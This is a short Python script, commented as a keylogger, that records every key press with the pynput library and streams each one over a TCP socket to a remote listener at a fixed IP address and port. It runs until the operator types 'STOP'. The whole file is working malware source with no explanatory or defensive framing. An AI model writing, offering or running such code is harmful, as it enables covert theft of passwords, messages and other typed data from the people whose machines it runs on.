from pynput import keyboard
import socket
import threading

hostAddr = ('192.168.0.186', 3332)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Keylogger
def key_pressed(key):
    client.send(str(key).encode("utf-8"))

if __name__ == "__main__":
    client.connect(hostAddr)
    print("Sending connection request")

    listener = keyboard.Listener(on_press = key_pressed)
    listener.start()

    while True:
        secretWord = input()
        if secretWord == "STOP":
            client.send("b\' \'".encode("utf-8"))
            client.close()
            exit()




